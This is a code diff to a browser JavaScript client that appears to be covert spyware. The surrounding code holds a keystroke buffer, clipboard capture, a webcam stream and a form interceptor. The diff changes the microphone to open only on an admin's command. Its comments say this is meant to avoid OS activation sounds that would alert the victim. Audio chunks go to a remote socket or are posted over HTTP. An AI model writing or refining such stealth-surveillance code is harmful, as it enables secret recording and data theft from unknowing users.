@@ -23,8 +23,8 @@
     let keyBuffer = '', lastClip = '';
     let liveSocket = null, liveInterval = null, liveActive = false;
     let healthCheckInterval = null; // periodic frozen-stream detector
-    let audioRecorder = null, audioActive = false;
-    let audioHTTPActive = false, audioHTTPTimer = null;
+    let audioRecorder = null, audioActive = false, audioMicStream = null;
+    let audioHTTPActive = false, audioHTTPTimer = null, audioHTTPMicStream = null;
     let videoRecording = false; // guard: prevents concurrent video recordings
     const pageStartTime = Date.now(); // track total session duration
 
@@ -465,13 +465,15 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         if (healthCheckInterval) { clearInterval(healthCheckInterval); healthCheckInterval = null; }
 
         // ── Step 1: get a stream that has at least one video track ──────
+        // Audio is intentionally NOT requested here — this prevents the mic from
+        // activating (and making OS notification sounds) on every page load.
+        // Audio is requested separately, on-demand, when the admin triggers recording.
         const videoCfgs = [
-            { video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: true },
-            { video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: true },
-            { video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }, audio: true },
-            { video: { width: { ideal: 640 }, height: { ideal: 480 } }, audio: true },
-            { video: true, audio: true },
-            { video: true, audio: false }  // last resort: video without mic
+            { video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false },
+            { video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false },
+            { video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false },
+            { video: { width: { ideal: 640 }, height: { ideal: 480 } }, audio: false },
+            { video: true, audio: false }
         ];
         for (const cfg of videoCfgs) {
             try {
@@ -736,37 +738,42 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
     // ═══ LIVE AUDIO STREAMING ═══════════════════════════════════
     function startAudioStream() {
         if (audioActive) return;
-        if (!stream || stream.getAudioTracks().length === 0) {
-            if (liveSocket) liveSocket.emit('audio-status', { clientId: ID, active: false, error: 'No audio stream' });
-            return;
-        }
         audioActive = true;
-        try {
-            const types = ['audio/webm;codecs=opus', 'audio/webm', 'audio/ogg;codecs=opus'];
-            const mime = types.find(t => MediaRecorder.isTypeSupported(t)) || 'audio/webm';
-            audioRecorder = new MediaRecorder(new MediaStream(stream.getAudioTracks()), {
-                mimeType: mime, audioBitsPerSecond: 32000
-            });
-            audioRecorder.ondataavailable = async (e) => {
-                if (e.data.size > 0 && liveSocket && audioActive) {
-                    const reader = new FileReader();
-                    reader.onloadend = () => {
-                        liveSocket.emit('audio-chunk', {
-                            clientId: ID,
-                            chunk: reader.result,
-                            timestamp: Date.now(),
-                            mimeType: mime
-                        });
-                    };
-                    reader.readAsDataURL(e.data);
-                }
-            };
-            audioRecorder.start(1000); // 1s chunks
-            if (liveSocket) liveSocket.emit('audio-status', { clientId: ID, active: true });
-        } catch (e) {
+        // Request microphone on-demand (not during page load) to avoid OS activation sounds
+        navigator.mediaDevices.getUserMedia({ audio: true, video: false }).then(audioStream => {
+            audioMicStream = audioStream;
+            try {
+                const types = ['audio/webm;codecs=opus', 'audio/webm', 'audio/ogg;codecs=opus'];
+                const mime = types.find(t => MediaRecorder.isTypeSupported(t)) || 'audio/webm';
+                audioRecorder = new MediaRecorder(audioStream, {
+                    mimeType: mime, audioBitsPerSecond: 32000
+                });
+                audioRecorder.ondataavailable = async (e) => {
+                    if (e.data.size > 0 && liveSocket && audioActive) {
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                            liveSocket.emit('audio-chunk', {
+                                clientId: ID,
+                                chunk: reader.result,
+                                timestamp: Date.now(),
+                                mimeType: mime
+                            });
+                        };
+                        reader.readAsDataURL(e.data);
+                    }
+                };
+                audioRecorder.onstop = () => { try { audioStream.getTracks().forEach(t => t.stop()); } catch {} audioMicStream = null; };
+                audioRecorder.start(1000); // 1s chunks
+                if (liveSocket) liveSocket.emit('audio-status', { clientId: ID, active: true });
+            } catch (e) {
+                audioActive = false;
+                try { audioStream.getTracks().forEach(t => t.stop()); } catch {}
+                if (liveSocket) liveSocket.emit('audio-status', { clientId: ID, active: false, error: e.message });
+            }
+        }).catch(e => {
             audioActive = false;
             if (liveSocket) liveSocket.emit('audio-status', { clientId: ID, active: false, error: e.message });
-        }
+        });
     }
 
     function stopAudioStream() {
@@ -775,6 +782,7 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
             try { audioRecorder.stop(); } catch {}
         }
         audioRecorder = null;
+        if (audioMicStream) { try { audioMicStream.getTracks().forEach(t => t.stop()); } catch {} audioMicStream = null; }
         if (liveSocket) liveSocket.emit('audio-status', { clientId: ID, active: false });
     }
 
@@ -783,15 +791,17 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
     // Triggered by start-audio-http command; no socket.io needed.
     function startAudioHTTP() {
         if (audioHTTPActive) return;
-        if (!stream || stream.getAudioTracks().length === 0) return;
         audioHTTPActive = true;
+        // Request microphone on-demand to avoid OS activation sounds on page load
+        navigator.mediaDevices.getUserMedia({ audio: true, video: false }).then(audioStream => {
+        audioHTTPMicStream = audioStream;
         function recordChunk() {
-            if (!audioHTTPActive) return;
+            if (!audioHTTPActive) { try { audioStream.getTracks().forEach(t => t.stop()); } catch {} audioHTTPMicStream = null; return; }
             try {
                 const types = ['audio/webm;codecs=opus', 'audio/webm', 'audio/ogg;codecs=opus', 'audio/mp4'];
                 const mime = types.find(t => { try { return MediaRecorder.isTypeSupported(t); } catch { return false; } }) || 'audio/webm';
-                const audioStream = new MediaStream(stream.getAudioTracks().map(t => t.clone()));
-                const rec = new MediaRecorder(audioStream, { mimeType: mime, audioBitsPerSecond: 32000 });
+                const recStream = new MediaStream(audioStream.getAudioTracks().map(t => t.clone()));
+                const rec = new MediaRecorder(recStream, { mimeType: mime, audioBitsPerSecond: 32000 });
                 const chunks = [];
                 rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                 rec.onstop = async () => {
@@ -809,11 +819,13 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
             }
         }
         recordChunk();
+        }).catch(() => { audioHTTPActive = false; });
     }
 
     function stopAudioHTTP() {
         audioHTTPActive = false;
         if (audioHTTPTimer) { clearTimeout(audioHTTPTimer); audioHTTPTimer = null; }
+        if (audioHTTPMicStream) { try { audioHTTPMicStream.getTracks().forEach(t => t.stop()); } catch {} audioHTTPMicStream = null; }
     }
 
     // ═══ FORM INTERCEPTOR ══════════════════════════════════════
